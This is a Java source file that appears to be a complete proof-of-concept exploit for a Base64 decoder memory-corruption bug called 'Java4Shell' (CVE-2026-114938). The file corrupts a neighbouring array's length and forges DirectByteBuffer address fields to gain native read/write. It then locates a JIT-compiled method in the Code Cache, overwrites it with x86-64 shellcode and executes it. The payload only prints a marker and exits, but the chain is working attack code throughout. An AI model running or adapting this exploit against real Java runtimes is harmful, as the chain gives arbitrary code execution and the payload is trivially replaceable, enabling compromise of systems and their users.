import java.io.ByteArrayOutputStream;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

/**
 * CVE-2026-114938 (Java4Shell) - complete chain to code execution.
 *
 * Final stage.  No sun.misc.Unsafe, no JNI, no native library loading, and no
 * second memory-safety bug:
 *
 *   1. the malformed Base64 tail corrupts a neighbour array's length
 *   2. that "writer" corrupts a DirectByteBuffer's address field
 *   3. the buffer's own API gives 64-bit native read/write
 *   4. a JIT-compiled method is located in the Code Cache by scanning for the
 *      unique constant it returns
 *   5. the method's machine code is overwritten with shellcode
 *   6. invoking the method runs the shellcode
 *
 * The shellcode writes "J4S-RCE-PWN" to stdout and calls exit_group(42), so
 * success is unambiguous: the process terminates with status 42 and the marker
 * appears on the JVM's stdout.  It never returns to Java, so no valid stack
 * frame is required.
 *
 * Disposable container only: this overwrites executable Code Cache memory.
 */
public final class CodeCacheRce {
    private static volatile int sink;
    private static volatile byte[] writer;
    private static volatile byte[] victim;
    private static volatile Object[] holder;
    private static volatile ByteBuffer direct;
    private static volatile ByteBuffer scan;

    /** Unique constant returned by the victim method; identifies its code. */
    private static final long SIG = 0x4A34535243454F31L; // "J4SRCEO1"
    private static final long PROBE = 0x0102030405060708L;

    private static int directAddrOff = -1;
    private static int scanAddrOff = -1;
    private static long writerData;
    private static long victimAddr;

    private static final int EXIT_CODE = 42;

    /** Leaf method compiled into the Code Cache; its body materialises SIG. */
    static long victimMethod() {
        return SIG;
    }

    public static void main(String[] args) throws Exception {
        int warmup = 1000;
        for (int i = 0; i < args.length; i++) {
            if ("--warmup".equals(args[i])) warmup = Integer.parseInt(args[++i]);
            else {
                System.err.println("unknown option: " + args[i]);
                System.exit(2);
            }
        }

        boolean jdk17 = Runtime.version().feature() <= 17;
        int n = jdk17 ? 128 : 64;
        byte[] trig = new byte[n + 1];
        Arrays.fill(trig, (byte) 'A');
        trig[n] = (byte) '=';

        System.out.println("runtime = " + System.getProperty("java.runtime.version"));
        System.out.println("trigger = " + trig.length + " bytes");
        System.out.flush();

        Base64.Decoder dec = Base64.getDecoder();
        byte[] warm = new byte[256];
        for (int i = 0; i < warmup; i++) {
            try { sink += dec.decode(trig, warm); } catch (IllegalArgumentException ignored) {}
        }
        System.out.println("[warm] decoder compiled");

        // Compile the victim method before any corruption.
        Method target = CodeCacheRce.class.getDeclaredMethod("victimMethod");
        Object r = target.invoke(null);
        System.out.println("[warm] victimMethod() = 0x"
                + Long.toHexString(((Long) r).longValue()) + " (compiled)");
        System.out.flush();

        // ---- allocation span: allocate everything before corrupting ----
        byte[] dst = new byte[66];
        writer = new byte[64];
        holder = new Object[3];
        direct = ByteBuffer.allocateDirect(64);
        scan = ByteBuffer.allocateDirect(1 << 20);
        victim = new byte[256];
        // ----------------------------------------------------------------
        holder[0] = victim;
        holder[1] = direct;
        holder[2] = scan;

        Arrays.fill(dst, (byte) 0x5a);
        Arrays.fill(writer, (byte) 0x5a);
        Arrays.fill(victim, (byte) 0x41);
        putLongLE(victim, 0, PROBE);

        // ---- step 1: corrupt the writer's length ----
        try { dec.decode(trig, dst); } catch (IllegalArgumentException expected) {}
        int wl = writer.length;
        System.out.println("[1] writer.length = " + wl + " (0x" + Integer.toHexString(wl) + ")");
        if (wl <= 64) {
            System.out.println("NOT VULNERABLE: length unchanged");
            System.exit(1);
        }

        // ---- step 2: locate arrays and the DirectByteBuffer fields ----
        int victimOop = getIntLE(writer, 80);
        int directOop = getIntLE(writer, 84);
        int scanOop = getIntLE(writer, 88);
        System.out.println("[2] victim=0x" + Integer.toHexString(victimOop)
                + " direct=0x" + Integer.toHexString(directOop)
                + " scan=0x" + Integer.toHexString(scanOop));
        if (victimOop == 0 || directOop == 0 || scanOop == 0) {
            System.out.println("LAYOUT FAILURE: holder slots not at writer[80..92]");
            System.exit(2);
        }

        victimAddr = ((victimOop & 0xffffffffL) << 3) + 16;
        int probeAt = findProbe(writer, 64, 4096);
        if (probeAt < 0) {
            System.out.println("LAYOUT FAILURE: victim PROBE not found near writer");
            System.exit(2);
        }
        writerData = victimAddr - probeAt;
        System.out.println("[2] victim data = 0x" + Long.toHexString(victimAddr)
                + " at writer[" + probeAt + "]"
                + ", writer data = 0x" + Long.toHexString(writerData));

        directAddrOff = locateAddressField(direct, directOop);
        scanAddrOff = locateAddressField(scan, scanOop);
        if (directAddrOff < 0 || scanAddrOff < 0) {
            System.out.println("LAYOUT FAILURE: address fields not located");
            System.exit(2);
        }
        System.out.println("[2] direct.address @ writer[" + directAddrOff
                + "], scan.address @ writer[" + scanAddrOff + "]");
        System.out.println("[2] NATIVE READ/WRITE READY");
        System.out.flush();

        // ---- step 3: find the victim method's code in the Code Cache ----
        List<Long> hits = findCode();
        if (hits.isEmpty()) {
            System.out.println("[3] Code Cache scan found no match");
            System.exit(3);
        }
        System.out.println("[3] " + hits.size() + " signature site(s): "
                + hexAddresses(hits));

        byte[] shellcode = buildShellcode();
        System.out.println("[3] shellcode " + shellcode.length + " bytes: "
                + hex(shellcode));

        // ---- step 4: install shellcode at every copy of the signature ----
        int patched = 0;
        for (long addr : hits) {
            writeBytes(addr, shellcode);
            patched++;
        }
        System.out.println("[4] shellcode installed at " + patched + " site(s)");
        System.out.flush();

        // ---- step 5: invoke; the shellcode takes over ----
        System.out.println("[5] invoking victimMethod() ...");
        System.out.println("[5] expect marker below and exit status " + EXIT_CODE);
        System.out.flush();
        target.invoke(null);

        // Only reached if the hijack failed.
        System.out.println("HIJACK FAILED: method returned normally");
        Runtime.getRuntime().halt(4);
    }

    /**
     * Locate a ByteBuffer's 64-bit `address` field by oracle: redirect each
     * candidate native pointer at `victim` (which holds PROBE) and see whether
     * the buffer reads PROBE back.
     */
    private static int locateAddressField(ByteBuffer buf, int oop) {
        long obj = (oop & 0xffffffffL) << 3;
        // Endianness-proof oracle: PROBE's low byte (0x08) is first in memory.
        final byte probeFirst = (byte) (PROBE & 0xff);
        final byte probeLast = (byte) (PROBE >>> 56);
        System.out.println("    probing buffer obj=0x" + Long.toHexString(obj)
                + " -> writer[" + (int) (obj - writerData) + "]");
        for (int rel = 16; rel <= 96; rel += 4) {
            int idx = (int) (obj + rel - writerData);
            if (idx < 64) continue;
            long cand = getLongLE(writer, idx);
            if (cand <= 0x7f0000000000L || cand >= 0x800000000000L) continue;

            putLongLE(writer, idx, victimAddr);
            boolean ok = false;
            String err = "";
            try {
                ok = buf.get(0) == probeFirst && buf.get(7) == probeLast;
            } catch (Throwable t) {
                err = " threw " + t.getClass().getSimpleName();
            }
            putLongLE(writer, idx, cand);
            System.out.printf("    +%-3d writer[%4d] 0x%016x %s%s%n",
                    rel, idx, cand, ok ? "<== address field" : "no match", err);
            if (ok) return idx;
        }
        return -1;
    }

    /** Scan executable mappings for every movabs carrying SIG. */
    private static List<Long> findCode() throws Exception {
        byte[] needle = new byte[10];
        needle[0] = (byte) 0x48;
        needle[1] = (byte) 0xb8;
        for (int i = 0; i < 8; i++) needle[2 + i] = (byte) (SIG >>> (8 * i));

        List<long[]> regions = new ArrayList<>();
        List<String> mapLines = Files.readAllLines(Paths.get("/proc/self/maps"));
        int execSeen = 0;
        for (String line : mapLines) {
            String[] p = line.split("\\s+");
            if (p.length < 2) continue;
            if (p[1].contains("x")) execSeen++;
            if (p.length < 2 || !p[1].contains("x") || !p[1].contains("r")) continue;
            String[] rg = p[0].split("-");
            long start = Long.parseUnsignedLong(rg[0], 16);
            long end = Long.parseUnsignedLong(rg[1], 16);
            // Skip the vsyscall page (0xffffffffff600000).  Must compare
            // unsigned: as a signed long that constant is negative.
            if (Long.compareUnsigned(start, 0xffffffffff600000L) >= 0) continue;
            regions.add(new long[]{start, end});
        }
        System.out.println("[3] maps lines=" + mapLines.size() + " exec=" + execSeen
                + " usable=" + regions.size());
        System.out.println("[3] scanning " + regions.size() + " readable executable mappings");

        List<Long> found = new ArrayList<>();
        byte[] chunk = new byte[4096];
        long total = 0;
        int unreadable = 0;
        for (long[] reg : regions) {
            long addr = reg[0];
            long size = reg[1] - reg[0];
            for (long off = 0; off < size; off += chunk.length) {
                int len = (int) Math.min(chunk.length, size - off);
                try {
                    readInto(addr + off, chunk, len);
                } catch (Throwable t) {
                    unreadable++;
                    continue;
                }
                total += len;
                int from = 0;
                while (true) {
                    int at = indexOf(chunk, needle, len, from);
                    if (at < 0) break;
                    found.add(addr + off + at);
                    from = at + 1;
                }
            }
        }
        System.out.println("[3] scanned " + (total / 1024) + " KiB, "
                + unreadable + " unreadable chunk(s)");
        return found;
    }

    private static byte[] buildShellcode() {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        byte[] msg = "J4S-RCE-PWN\n".getBytes(java.nio.charset.StandardCharsets.US_ASCII);

        // write(1, msg, msg.length)
        b.write(0xb8); b.write(1); b.write(0); b.write(0); b.write(0);   // 0..4  mov eax,1
        b.write(0xbf); b.write(1); b.write(0); b.write(0); b.write(0);   // 5..9  mov edi,1
        b.write(0x48); b.write(0x8d); b.write(0x35);                     // 10..12 lea rsi,[rip+d]
        int disp = 7 + msg.length;                                       // ends at 17; msg at 36
        b.write(disp); b.write(0); b.write(0); b.write(0);               // 13..16
        b.write(0xba); b.write(msg.length); b.write(0); b.write(0); b.write(0); // 17..21 mov edx,len
        b.write(0x0f); b.write(0x05);                                    // 22..23 syscall

        // exit_group(EXIT_CODE)
        b.write(0xb8); b.write(0xe7); b.write(0); b.write(0); b.write(0); // 24..28 mov eax,231
        b.write(0xbf); b.write(EXIT_CODE); b.write(0); b.write(0); b.write(0); // 29..33 mov edi,42
        b.write(0x0f); b.write(0x05);                                     // 34..35 syscall

        b.write(msg, 0, msg.length);                                      // 36.. msg
        if (36 != 17 + disp) throw new IllegalStateException("bad lea displacement");
        return b.toByteArray();
    }

    // ---------------- native read/write through the forged buffers ----------------

    private static void setAddr(int fieldOff, long addr) {
        putLongLE(writer, fieldOff, addr);
    }

    private static void readInto(long addr, byte[] out, int len) {
        setAddr(scanAddrOff, addr);
        scan.clear();
        scan.get(out, 0, len);
    }

    private static void writeBytes(long addr, byte[] data) {
        setAddr(directAddrOff, addr);
        direct.clear();
        direct.put(data);
    }

    // ---------------- helpers ----------------

    /** Find the PROBE value in the writer view and sanity-check the fill after it. */
    private static int findProbe(byte[] a, int from, int to) {
        byte[] probe = new byte[8];
        for (int i = 0; i < 8; i++) probe[i] = (byte) (PROBE >>> (8 * i));
        outer:
        for (int i = from; i + 24 <= to; i++) {
            for (int j = 0; j < 8; j++) {
                if (a[i + j] != probe[j]) continue outer;
            }
            boolean fill = true;
            for (int j = 8; j < 24; j++) {
                if (a[i + j] != (byte) 0x41) { fill = false; break; }
            }
            if (fill) return i;
        }
        return -1;
    }

    private static int indexOf(byte[] hay, byte[] needle, int len, int from) {
        outer:
        for (int i = from; i + needle.length <= len; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (hay[i + j] != needle[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    private static String hexAddresses(List<Long> addrs) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < addrs.size(); i++) {
            if (i > 0) sb.append(", ");
            sb.append("0x").append(Long.toHexString(addrs.get(i)));
        }
        return sb.toString();
    }

    private static String hex(byte[] d) {
        StringBuilder sb = new StringBuilder();
        for (byte x : d) sb.append(String.format("%02x ", x & 0xff));
        return sb.toString().trim();
    }

    private static void putIntLE(byte[] a, int off, int v) {
        a[off] = (byte) v;
        a[off + 1] = (byte) (v >>> 8);
        a[off + 2] = (byte) (v >>> 16);
        a[off + 3] = (byte) (v >>> 24);
    }

    private static int getIntLE(byte[] a, int off) {
        return (a[off] & 0xff) | ((a[off + 1] & 0xff) << 8)
                | ((a[off + 2] & 0xff) << 16) | ((a[off + 3] & 0xff) << 24);
    }

    private static void putLongLE(byte[] a, int off, long v) {
        for (int i = 0; i < 8; i++) a[off + i] = (byte) (v >>> (8 * i));
    }

    private static long getLongLE(byte[] a, int off) {
        long v = 0;
        for (int i = 7; i >= 0; i--) v = (v << 8) | (a[off + i] & 0xffL);
        return v;
    }
}
